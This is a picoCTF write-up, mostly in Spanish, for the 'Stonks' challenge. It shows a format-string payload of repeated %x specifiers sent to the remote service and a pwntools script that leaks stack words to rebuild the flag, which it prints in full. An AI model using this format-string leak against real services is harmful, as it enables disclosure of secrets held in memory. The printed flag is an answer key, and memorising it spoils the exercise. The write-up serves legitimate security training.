## Descripción 
```
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/e4d297ce964e4f54225786fe7b153b4b/vuln.c) `nc mercury.picoctf.net 20195`
```
[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#objetivo)
## Solución
```
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp$ wget https://mercury.picoctf.net/static/e4d297ce964e4f54225786fe7b153b4b/vuln.c
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp$ nc mercury.picoctf.net 20195
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
961e450804b00080489c3f7f66d80ffffffff1961c160f7f74110f7f66dc70961d1801961e430961e4506f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3534303664303664fff9007df7fa1af8f7f7444093df30010f7e03ce9f7f750c0f7f665c0f7f66000fff994f8f7df468df7f665c08048ecafff995040f7f88f09804b000f7f66000f7f66e20fff99538f7f8ed50f7f6789093df300f7f66000804b000fff995388048c86961c160fff99524fff995388048be9f7f663fc0fff995ecfff995e411961c16093df300fff9955000f7da9fa1f7f66000f7f660000f7da9fa11fff995e4fff995ecfff9957410f7f66000f7f8970af7fa10000f7f6600000
Portfolio as of Wed Nov 13 04:01:27 UTC 2024


1 shares of HVR
4 shares of JZS
6 shares of T
17 shares of ERV
18 shares of QPW
9 shares of I
247 shares of ONGP
659 shares of PR
383 shares of H
127 shares of PW
189 shares of BN
Goodbye!
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp$ nano solve.py
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp$ python3 solve.py
[+] Opening connection to mercury.picoctf.net on port 20195: Done
[*] Closed connection to mercury.picoctf.net port 20195
[+] Opening connection to mercury.picoctf.net on port 20195: Done
[*] Closed connection to mercury.picoctf.net port 20195
[+] Opening connection to mercury.picoctf.net on port 20195: Done
[*] Closed connection to mercury.picoctf.net port 20195
[+] Opening connection to mercury.picoctf.net on port 20195: Done
[*] Closed connection to mercury.picoctf.net port 20195
[+] Opening connection to mercury.picoctf.net on port 20195: Done
[*] Closed connection to mercury.picoctf.net port 20195
[+] Opening connection to mercury.picoctf.net on port 20195: Done
[*] Closed connection to mercury.picoctf.net port 20195
[+] Opening connection to mercury.picoctf.net on port 20195: Done
[*] Closed connection to mercury.picoctf.net port 20195
[+] Opening connection to mercury.picoctf.net on port 20195: Done
[*] Closed connection to mercury.picoctf.net port 20195
[+] Opening connection to mercury.picoctf.net on port 20195: Done
[*] Closed connection to mercury.picoctf.net port 20195
Leaked flag: picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}

flag: picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}
```
[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#soluci%C3%B3n)

## Notas Adicionales
```
Básicamente se trata de cargar el contenido del archivo que contiene la bandera (en realidad llamada `api`) en la variable `api_buf`. Como es una variable local, se cargará en la pila. Por lo tanto, la idea es filtrar el valor de `api_buf`utilizando la vulnerabilidad Format String.

Una lista de `%x`formatos funciona bien, pero para ser más específicos, podemos usar `%1$x`para extraer el primer valor de la pila, `%2$x`para el segundo y así sucesivamente.

Hagamos un script Python simple que tome los primeros 30 valores:
#!/usr/bin/env python3

from pwn import context, remote, p32  # Importamos p32 desde pwntools

def dump(n: int) -> str:
    p = remote('mercury.picoctf.net', 20195)
    p.sendlineafter(b'2) View my portfolio', b'1')
    p.sendlineafter(b'What is your API token?', f'%{n}$x'.encode())
    p.recvuntil(b'Buying stonks with token:\n')

    leak = p.recvuntil(b'\n').decode()

    p.close()

    return leak.strip()


def main():
    flag = b''

    for i in range(15, 24):
        flag += p32(int(dump(i), 16))  # Convertimos el valor hexadecimal a 32 bits little-endian
    flag += b'}'
    
    print(f'Leaked flag: {flag.decode()}')


if __name__ == '__main__':
    main()

Sabemos que los indicadores picoCTF tienen un formato especial (es decir, `picoCTF{...}`). Los primeros cuatro caracteres son `pico`, que en dígitos hexadecimales es `0x6f636970`(formato little-endian). Este valor está en la posición 15 en la salida anterior.

El código ASCII de `}`es `0x7d`que está en la posición 24. La bandera está entre las posiciones 15 y 24. Como las posiciones no cambiarán, tomemos estos valores y los decodifiquemos byte a byte. En realidad, extraeremos hasta la posición 23, ya que en la posición 24 solo tenemos `}`y el byte nulo (fin de cadena en C):

def main():
    flag = b''

    for i in range(15, 24):
        flag += p32(int(dump(i), 16))

    flag += b'}'

    print(f'Leaked flag: {flag.decode()}')  


if __name__ == '__main__':
    main()

Y aquí podremos obtener la bandera

```

[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#notas-adicionales)

### Referencias